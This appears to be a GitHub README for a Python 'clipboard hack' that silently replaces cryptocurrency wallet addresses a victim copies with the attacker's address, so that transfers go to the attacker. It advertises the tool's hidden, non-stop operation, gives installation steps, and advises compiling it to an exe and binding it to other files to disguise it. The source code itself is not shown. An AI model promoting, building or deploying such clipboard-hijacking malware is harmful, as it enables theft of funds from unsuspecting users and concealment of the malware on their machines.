# Cryptocurrencies-hack-with-clipboard-in-python
A great code to hack cryptocurrencies with clipboard! 

- This source code replaces the given wallet address with original wallet address when the target wants to transfer cryptocurrencies, and the cryptocurrencies are sent to you!
- No terminal page visible !
- Non stop!

Download the project. Then go to the project directory in the terminal and type:

1.pip install virtualenv 

2.virtualenv env 

3."env/Scripts/activate.bat" 

4.pip install -r requirements.txt

Next open the source code and fill out config() function fields in source code !

Attention! This code works perfectly if it is converted to exe and binded!

Done ! Enjoy :)!
